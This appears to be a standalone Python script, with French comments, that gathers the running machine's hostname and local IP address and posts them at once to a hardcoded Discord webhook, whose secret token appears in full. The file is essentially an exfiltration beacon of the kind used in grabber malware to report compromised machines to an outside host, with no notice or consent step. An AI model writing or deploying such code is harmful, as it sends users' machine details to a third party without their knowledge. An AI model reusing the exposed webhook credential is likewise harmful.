import socket
import requests
import json

def get_local_ip():
    try:
        host_name = socket.gethostname()
        local_ip = socket.gethostbyname(host_name)
        return local_ip, host_name
    except Exception as e:
        print("Erreur lors de la récupération de l'adresse IP locale :", e)
        return None, None

def send_ip_and_hostname_to_discord(ip, hostname):
    webhook_url = 'https://discord.com/api/webhooks/1156636409281654896/Q8Cjsj-Ej4yL2xyKs1bL8LvMkmbyyMD56YE8sbk6aFAYI5QT_uDkOlOurePgl_3U_yS-'
    data = {
        "embeds": [
            {
                "title": "Adresse IP et Nom de la machine",
                "color": 0,
                "fields": [
                    {
                        "name": "Nom de la Machine",
                        "value": f"``{hostname}``",  # Encadrez le nom de la machine avec des backticks
                        "inline": False
                    },
                    {
                        "name": "Adresse IP Locale",
                        "value": f"``{local_ip}``",  # Encadrez l'adresse IP locale avec des backticks
                        "inline": False
                    },
                ]
            }
        ]
    }

    headers = {"Content-Type": "application/json"}

    try:
        response = requests.post(webhook_url, data=json.dumps(data), headers=headers)
        if response.status_code == 204:
            print("Adresse IP locale et nom de la machine envoyés avec succès à Discord.")
        else:
            print("Erreur lors de l'envoi de l'adresse IP locale à Discord :", response.status_code)
    except Exception as e:
        print("Erreur lors de l'envoi de l'adresse IP locale à Discord :", e)

local_ip, hostname = get_local_ip()
if local_ip and hostname:
    send_ip_and_hostname_to_discord(local_ip, hostname)